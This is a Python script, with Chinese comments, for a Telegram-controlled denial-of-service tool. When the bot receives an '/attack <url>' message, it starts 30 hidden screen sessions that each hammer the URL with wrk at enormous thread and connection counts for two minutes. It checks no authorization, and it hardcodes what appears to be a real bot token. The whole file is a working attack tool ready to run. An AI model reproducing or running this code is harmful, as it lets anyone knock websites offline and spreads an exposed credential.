import os
import random
import string
import subprocess
import requests
import time

# Telegram Bot token
BOT_TOKEN = "8094008450:AAFCswCR7bA_eWtBGc_tlH9vnSTYtvs5GZE"
BASE_URL = f"https://api.telegram.org/bot{BOT_TOKEN}/"

# 函数：发送消息到指定用户
def send_message(chat_id, text):
    url = BASE_URL + f"sendMessage?chat_id={chat_id}&text={text}"
    response = requests.get(url)
    return response.json()

# 函数：执行攻击命令并获取输出
def perform_attack(url):
    results = []
    
    # 创建30个screen会话执行命令
    for _ in range(30):
        screen_name = ''.join(random.choices(string.ascii_letters + string.digits, k=10))
        command = f"screen -dmS {screen_name} bash -c 'ulimit -n 1000000 && wrk -t200000 -c400000 -d120s {url}'"
        subprocess.run(command, shell=True)
        time.sleep(1)  # 确保screen启动后再执行下一个命令
    
    results.append(f"Attack started on URL: {url}. 30 screen sessions have been launched.")
    return "\n".join(results)

# 函数：监听Telegram消息并解析命令
def handle_messages():
    offset = None
    while True:
        url = BASE_URL + "getUpdates"
        if offset:
            url += f"?offset={offset}"

        response = requests.get(url)
        updates = response.json().get("result", [])

        for update in updates:
            message = update.get("message", {})
            chat_id = message.get("chat", {}).get("id")
            text = message.get("text", "")

            # 获取/attack命令后的URL
            if text.startswith("/attack"):
                _, attack_url = text.split(" ", 1)
                attack_result = perform_attack(attack_url)
                send_message(chat_id, attack_result)
            
            # 更新offset
            offset = update.get("update_id", 0) + 1

if __name__ == "__main__":
    handle_messages()
